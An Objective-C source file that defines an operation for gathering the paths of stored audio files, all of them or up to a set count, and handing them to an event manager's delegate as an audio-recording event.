//
//  HistoricalEventAudioOP.m
//  HistoricalEventManager
//
//  Created by Benjawan Tanarattanakorn on 1/6/2558 BE.
//
//

#import "HistoricalEventAudioOP.h"


@interface HistoricalEventAudioOP (private)
- (void) captureHistoricalAudio;
@end

@implementation HistoricalEventAudioOP

- (void) main {
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	DLog(@"---- Audio main ----")
	[self captureHistoricalAudio];
	[pool release];
}

#pragma mark - Public Method


- (void) captureHistoricalAudio {
    NSArray *audios = [NSArray array];
    
    // -- STEP 1: Get NSArray of path NSString
    
    // check total number of event
    if (mTotalNumber == -1) {
        DLog(@"Get All AUDIOS")
        audios = [self allAudios];
    } else {
        DLog(@"Get %ld AUDIOS", (long)mTotalNumber)
        audios = [self allAudiosWithMax:mTotalNumber];
    }
    
    if ([mDelegate respondsToSelector:mOPCompletedSelector]) {
        DLog(@"Gonna callback to Historical Media Event Manager")
		NSDictionary *capturedData = [NSDictionary dictionaryWithObjectsAndKeys:
                                      [NSNumber numberWithUnsignedInt:kHistoricalEventTypeAudioRecording],     kHistoricalEventTypeKey,
                                      audios,                                                         kHistoricalEventDataKey,
                                      nil];
        
		[mDelegate performSelector:mOPCompletedSelector
                          onThread:mThread
                        withObject:capturedData
                     waitUntilDone:NO];
	}
}


#pragma mark - Private Methods


- (NSArray *) allAudios {
    // Note that in case of Audio, threre are database
    NSArray *audios = [self getAllFilePathsWithSize:-1
                                               type:[self audioTypes]
                                           rootPath:kAudioPath];
    return audios;
}

- (NSArray *) allAudiosWithMax: (NSInteger) aMaxNumber {
    NSArray *audios = [self getAllFilePathsWithSize:-1
                                               type:[self audioTypes]
                                           rootPath:kAudioPath
                                              count:aMaxNumber];
    return audios;
}



@end
